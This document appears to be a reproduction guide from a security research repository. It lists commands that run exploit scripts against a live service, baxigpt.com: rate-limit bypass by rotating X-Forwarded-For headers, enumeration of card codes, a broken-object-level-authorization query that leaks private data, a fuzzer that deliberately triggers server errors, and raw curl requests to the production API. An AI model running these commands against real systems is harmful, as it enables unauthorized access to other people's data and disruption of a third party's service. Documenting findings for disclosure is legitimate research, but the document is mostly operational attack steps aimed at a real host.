# Reproduction Guide

All commands assume repository root and Python 3.10+.

## Prerequisites

```bash
cd baxigpt-security-research   # or your clone path
python3 -m py_compile exploits/*.py
```

## Unified audit CLI

```bash
# Health check
python3 exploits/baxigpt_audit.py health

# Verify a card (uses XFF rotation)
python3 exploits/baxigpt_audit.py code-info --code EU-HFNDFHD4

# Privacy leak demonstration (BOLA)
python3 exploits/baxigpt_audit.py query --code EU-HFNDFHD4

# Confirm OpenAPI exposure
python3 exploits/baxigpt_audit.py openapi --lines 30
```

## Rate-limit bypass

```bash
python3 exploits/ip_bypass_enum.py --code EU-HFNDFHD4
python3 exploits/ip_bypass_enum.py --code EU-HFNDFHD4 --query
```

## Type-confusion fuzz (generates 500s; use sparingly)

```bash
python3 exploits/round8_fuzz500.py
# Output: artifacts/round8-fuzz.json
```

## Manual curl equivalents

```bash
curl -s https://baxigpt.com/healthz
curl -s https://baxigpt.com/openapi.json | python3 -m json.tool | head
curl -s -X POST https://baxigpt.com/api/query \
  -H 'Content-Type: application/json' \
  -d '{"code":"EU-HFNDFHD4"}'
```

## Evidence files

| Finding | Artifact |
|---------|----------|
| BOLA | `artifacts/round8-fuzz.json`, `artifacts/round8-cards.json` |
| Rate bypass | `artifacts/pentest-enum-bypass.json` |
| Fuzz 500s | `artifacts/round8-fuzz.json` |
| Admin brute negatives | `artifacts/round7-full.json` |
| Captured OpenAPI | `captures/openapi.json` |